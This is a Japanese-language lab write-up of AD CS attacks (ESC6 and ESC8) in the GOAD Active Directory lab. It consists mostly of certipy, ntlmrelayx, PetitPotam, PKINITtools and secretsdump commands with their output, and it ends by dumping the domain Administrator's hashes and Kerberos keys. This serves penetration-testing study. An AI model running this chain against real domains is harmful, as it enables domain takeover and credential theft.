---
title: "GOAD Writeup Ch3.5"
date: "2024-10-26"
draft: "false"
---

## Round 3.5
ADCS攻略をやる

### ESC 6

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca 'ESSOS-CA'  -upn administrator@essos.local
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with UPN 'administrator@essos.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/goad/braavos]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@essos.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@essos.local': aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b
```

### ESC 8

ntlmrelayxで待ち受けておく

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections

```

Petipotamで強制的に認証させる

[https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ python3 ~/tools/PetitPotam/PetitPotam.py 192.168.56.104  meereen.essos.local                                                    
/home/kali/tools/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence '\ '
  show_banner = '''

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

ntlmrelayxに下記のような出力が出てpfxファイルを取得できる

```jsx
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.56.12, attacking target http://192.168.56.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.56.23 as ESSOS/MEEREEN$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 192.168.56.12, attacking target http://192.168.56.23
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://192.168.56.23 as ESSOS/MEEREEN$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 22
[*] Writing PKCS#12 certificate to ./MEEREEN$.pfx
[*] Certificate successfully written to file
[*] Skipping user MEEREEN$ since attack was already performed
```

TGTを取得する(Pass-the-certificate)

[https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pfx ./MEEREEN\$.pfx -dc-ip 192.168.56.12 'essos.local/meereen$' 'meereen.ccache'
2024-10-26 03:50:51,619 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-10-26 03:50:51,980 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-10-26 03:50:51,987 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-10-26 03:50:51,987 minikerberos INFO     9c2e7549b0f4e6c4e681d337af9c63d83b765fb6f0aa2f6557e422834f573494
INFO:minikerberos:9c2e7549b0f4e6c4e681d337af9c63d83b765fb6f0aa2f6557e422834f573494
2024-10-26 03:50:51,989 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

`Administrator` ユーザーの認証情報をダンプしたりしてみる

```jsx
┌──(kali㉿kali)-[~/goad/braavos]
└─$ impacket-secretsdump -k -no-pass -just-dc-user Administrator ESSOS.LOCAL/'meereen$'@meereen.essos.local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:217e50203a5aba59cefa863c724bf61b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7fe27604209f1b09a5e6b65dc787322c276ad68b6f8c4d031330ba1d2cf92e0a
Administrator:aes128-cts-hmac-sha1-96:ae2bd7bb7370fab76dbce7574775785d
Administrator:des-cbc-md5:c43b5d5e049e5dc4
[*] Cleaning up... 
```